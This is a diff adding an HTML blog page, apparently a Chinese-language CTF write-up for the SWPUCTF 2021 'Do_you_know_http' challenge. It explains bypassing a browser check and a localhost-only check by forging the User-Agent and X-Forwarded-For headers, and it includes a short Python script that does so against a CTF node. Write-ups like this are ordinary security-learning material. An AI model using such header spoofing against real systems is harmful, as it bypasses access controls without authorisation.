@@ -1,0 +1,36 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>从0开始的web生涯 - [SWPUCTF 2021 新生赛]Do_you_know_http</title>
+</head>
+<body>
+<b>从0开始的web生涯 - [SWPUCTF 2021 新生赛]Do_you_know_http</b><br>
+<small>2025-04-27</small>
+<hr>
+<p>很简单的一题 主要考察header的使用<br>开头让我们用WLLM浏览器访问 肯定就是检测UA<br>然后说让我们在本地访问 header有一个头叫X-Forwarded-For 可以轻松绕过</p>
+<pre><code>import requests 
+
+import json
+
+header = &#123;
+
+  &#x27;user-agent&#x27;:&#x27;WLLM&#x27;,
+
+  &#x27;X-Forwarded-For&#x27;:&#x27;127.0.0.1&#x27;
+
+&#125;
+
+url = f&quot;http://node7.anna.nssctf.cn:23001/&quot;
+
+resp = requests.post(url=url,headers=header)
+
+print(resp.text)</code></pre>
+
+<p><br><br><img src="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http/image-20250427165424939.png" width="200"><br>
+<br>
+</p>
+
+<hr>
+<a href="index.html">返回首页</a> | <a href="../">返回主站</a>
+</body>
+</html>
